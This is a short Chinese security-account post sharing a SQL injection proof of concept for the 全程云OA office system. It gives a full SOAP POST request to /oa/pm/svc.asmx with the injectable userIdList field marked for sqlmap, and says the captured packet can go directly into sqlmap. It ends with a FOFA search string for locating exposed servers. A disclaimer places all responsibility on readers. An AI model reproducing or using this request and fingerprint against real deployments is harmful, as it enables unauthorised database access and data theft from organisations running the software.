#  全程云OA userIdList存在SQL注入漏洞   
小白菜安全  小白菜安全   2024-01-06 19:33  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1DGHJfrmHfeJlMWJMph1303yXArIWCrzRBBI2F0DEyeichaqAhU9t8UdJJAlOkC9RKHDFC90xjxkg/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
漏洞poc  
```
注入参数为userIdList
POST /oa/pm/svc.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetUsersInfo"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUsersInfo xmlns="http://tempuri.org/">
      <userIdList>string*</userIdList>
    </GetUsersInfo>
  </soap:Body>
</soap:Envelope>
```  
  
访问url+/oa/pm/svc.asmx?op=GetUsersInfo出现如下数据包代表漏洞存在，可直接放入sqlmap测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1DGHJfrmHfeJlMWJMph1303yXArIWCrzRBBI2F0DEyeichaqAhU9t8UdJJAlOkC9RKHDFC90xjxkg/640?wx_fmt=png&from=appmsg "")  
  
#  搜索语法  
  
**fofa：body="images/yipeoplehover.png"**  
  
  
